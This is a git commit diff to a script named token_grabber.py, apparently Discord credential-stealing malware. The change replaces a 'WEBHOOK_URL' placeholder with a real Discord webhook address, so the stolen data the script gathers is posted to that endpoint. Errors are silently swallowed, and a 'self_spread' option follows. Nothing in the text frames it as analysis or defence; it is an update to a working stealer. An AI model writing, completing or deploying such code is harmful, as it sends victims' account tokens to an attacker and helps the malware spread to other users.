74c25e9b653d618a32bb1093e9d67dd92b938080
Y-a-y1 <96704142+Y-a-y1@users.noreply.github.com>
2021-12-28 19:44:46 +0100

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://canary.discord.com/api/webhooks/917498981641252874/bcvOGXaFihT-MejxcmIgtM79bUNBM_2aVXxziYIkRZvgtizD27H39uhkNBnc1HX6xhY1", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
